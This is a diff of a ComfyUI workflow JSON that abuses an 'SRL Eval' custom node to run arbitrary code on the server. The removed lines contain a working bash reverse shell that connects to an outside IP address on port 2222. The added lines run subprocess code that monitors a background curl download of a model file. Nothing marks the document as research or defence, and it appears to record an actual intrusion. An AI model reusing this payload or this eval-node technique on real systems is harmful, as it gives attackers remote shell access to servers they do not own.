@@ -1,40 +1,28 @@
 {
-  "2": {
-    "inputs": {
-      "noise_seed": 693858169088745
-    },
+  "1": {
     "class_type": "RandomNoise",
-    "_meta": {
-      "title": "Случайный шум"
+    "inputs": {
+      "noise_seed": 51
+    }
+  },
+  "2": {
+    "class_type": "SRL Eval",
+    "inputs": {
+      "parameters": "a, b=None, c=\"foo\", *rest",
+      "code": "\nimport subprocess, os\nout_file='/opt/ComfyUI/models/unet/Krea2RedMix2.1-8Steps-fp8-scaled-ComfyUI.safetensors'\npid=subprocess.run(\"pgrep -f 'curl.*3086841'\", shell=True, capture_output=True, text=True).stdout.strip()\ns=os.path.getsize(out_file)/1024/1024/1024 if os.path.exists(out_file) else 0\ndone = not pid and s > 10\nif done:\n    with open(out_file,'rb') as f: h=f.read(16)\n    return f\"下载完成! {s:.2f} GB | header: {h}\"\nreturn f\"pid={pid} | {s:.2f} GB\"\n",
+      "arg0": [
+        "1",
+        0
+      ]
     }
   },
   "3": {
+    "class_type": "ShowText|pysssss",
     "inputs": {
-      "preview_markdown": "",
-      "preview_text": "",
-      "previewMode": null,
-      "source": [
-        "4",
-        0
-      ]
-    },
-    "class_type": "PreviewAny",
-    "_meta": {
-      "title": "Предпросмотр любого"
-    }
-  },
-  "4": {
-    "inputs": {
-      "parameters": "a, b=None, c=\"foo\", *rest",
-      "code": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
-      "arg0": [
+      "text": [
         "2",
         0
       ]
-    },
-    "class_type": "SRL Eval",
-    "_meta": {
-      "title": "SRL Eval"
     }
   }
 }
